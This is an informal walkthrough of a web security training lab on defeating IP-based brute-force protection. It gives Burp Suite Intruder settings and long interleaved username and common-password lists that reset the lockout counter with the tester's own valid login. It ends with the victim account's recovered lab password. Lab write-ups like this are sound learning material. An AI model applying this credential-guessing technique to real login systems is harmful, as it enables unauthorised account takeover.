Lab: Broken brute-force protection, IP block


This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

    Your credentials: wiener:peter
    Victim's username: carlos 
steps to solve this lab;
your account -> is blockeed if you logins 3 times in a raw this what I work on (add the correct user once(me) then add after it the victim user .

now;
enter invalid ->username,password + create a pitchfork on both(username,password ) in intruder.
Resource pool panel -> 
attack added to  maximum concurrent requests =1
-> ensure that login attempts are sent to the server in correct order
when go into intruder -> do that to brute force username
choose drop-down list with a 100 name -> make sure it contain alternates between ; your name,victim name(carlos
then to enumerate the password of that victim
choose; drop-down list and add the list of passwords

200 status code your username
302 response for requests with the username carlos
Log in to Carlos's account using the password that you identified and access his account page to solve the lab
distraction sheet;
remove the nums of lines into this editor
I will create a username list that appropriate with the list of passwords
one correct user,two for victim in order to match all of them at once
also you need to create the resource pool on burp suite at max 1 in order to send 1 request at a time to the server 
for username 
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener














for password ;

peter
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
111111
peter
1234567
dragon
peter
123123
baseball
peter
abc123
football
peter
monkey
letmein
peter
shadow
master
peter
666666
qwertyuiop
peter
123321
mustang
peter
1234567890
michael
peter
654321
superman
peter
1qaz2wsx
7777777
peter
121212
000000
peter
qazwsx
123qwe
peter
killer
trustno1
peter
jordan
jennifer
peter
zxcvbnm
asdfgh
peter
hunter
buster
peter
soccer
harley
peter
batman
andrew
peter
tigger
sunshine
peter
iloveyou
2000
peter
charlie
robert
peter
thomas
hockey
peter
ranger
daniel
peter
starwars
peter
klaster
112233
peter
george
computer
peter
michelle
jessica
peter
pepper
1111
peter
zxcvbn
555555
peter
11111111
131313
peter
freedom
777777
peter
pass
maggie
peter
159753
aaaaaa
peter
ginger
princess
peter
joshua
cheese
peter
amanda
summer
peter
love
ashley
peter
nicole
chelsea
peter
biteme
matthew
peter
access
yankees
peter
987654321
dallas
peter
austin
thunder
peter
taylor
matrix
peter
mobilemail
mom
peter
monitor
monitoring
peter
montana
moon
peter
moscow

the answer was;
username=carlos&password=trustno1

---

